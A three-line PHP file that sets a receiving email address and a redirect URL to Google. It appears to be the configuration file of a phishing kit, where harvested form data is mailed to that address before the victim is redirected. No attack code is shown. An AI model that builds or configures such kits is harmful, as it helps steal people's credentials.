<?php 
$Receive_email="freslyresumes@hotmail.com";
$redirect="https://www.google.com/";
?>